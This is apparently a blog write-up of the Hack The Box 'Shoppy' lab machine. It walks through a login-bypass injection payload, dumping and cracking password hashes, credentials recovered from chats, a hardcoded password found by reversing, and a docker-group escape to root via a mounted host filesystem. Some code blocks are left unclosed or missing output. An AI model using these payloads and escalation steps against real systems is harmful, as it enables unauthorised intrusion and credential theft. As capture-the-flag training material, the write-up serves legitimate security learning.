I will focus in both the port 80 and that weird thing in port 9093.

## Port 80

### First exploit

```

The login page is weird, injecting a `'` character the page just hangs. Trying SQL payloads I just got timeouts, maybe we can inject something else? I crafted something like this:

```
Hola' + '123' + 'Hola
```

And the page was able to return... The port 9093 looks like a dump of something related to Go so lets try to inject Go code instead of SQL:

```
Hola' || 1==1 || 'Hola
```

Using that payload I was able to bypass the login page and get access to the admin dashboard! In there, there is an option to search for users. I tried to, once again, inject the same payload I used before in the login page hoping to get all the users of the database and looks like we are lucky here:

```json
[
	{
		"_id":"62db0e93d6d6a999a66ee67a",
		"username":"admin",
		"password":"23c6877d9e2b564ef8b32c3a23de27b2"
	},
	{
		"_id":"62db0e93d6d6a999a66ee67b",
		"username":"josh",
		"password":"6ebcea65320589ca4f2f1ce039975995"
	}
]
```

I was able to crack the password for the `josh` user using the Rockyou dictionary:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Shoppy]
└─$ john --format=raw-md5 --wordlist=~/Wordlists/rockyou.txt hash

I tried the credentials `josh:remembermethisway` for SSH but no luck. 

### Finally user!


After some hours I was really lost whith this box but I found something using `wfuzz` instead of `gobuster` for enumerating virtual hosts:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Shoppy]

```

For some reason, `gobuster` was not able to find the Mattermost subdomain... Anyway, I was able to login using the found credentials and got the user and password for the SSH service in one of the chats: `jaeger:Sh0ppyBest@pp!`. Fun fact, the application is using a Mongo database and that is why the SQL payloads failed. Why I though about Go code instead of trying NoSQL? Well let's say that the port 9093 baited me...

## Privesc to `deploy`

Another thing I found in the Mattermost app was a chat speaking about a password manager. I was able to find it under `/home/deploy`, looks like the code and a file with credentials are also in there but Im only allowed to read the binary so I downloaded it to my machine.

According to `sudo -l` we can execute this binary as `deploy`:
```bash
jaeger@shoppy:/home/deploy$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

The binary asks for a master password when executed. According to the strings in the binary, it will read the credentials file from `/home/deploy` after introducing the correct password. The password is probably stored somewhere in the binary so time to reverse it. Using IDA was easy to find the password harcoded in the code, it was `Sample`.

<p align="center"><img alt="Screenshot of the IDA64 output" src="/assets/images/HackTheBox/Shoppy/idaOutput.PNG"></p>

Using this information, we can just get the password for the `deploy` user:


```bash
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

## Pwned!

The privilege escalation for `root` is pretty easy, the user `deploy` is part of the `docker` group so we can manage containers. Since the Alpine image is already in the machine the attack vector is straigh forward.

```bash
deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
deploy@shoppy:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   4 months ago   5.53MB
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

We only need to create a container that will have all the host filesystem mounted in the `/mnt` directory and will execute the `chroot` command to change the container filesystem root to the `/mnt` directory. Since we are root inside de container, we are now effectively root in the host machine.

```bash
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```
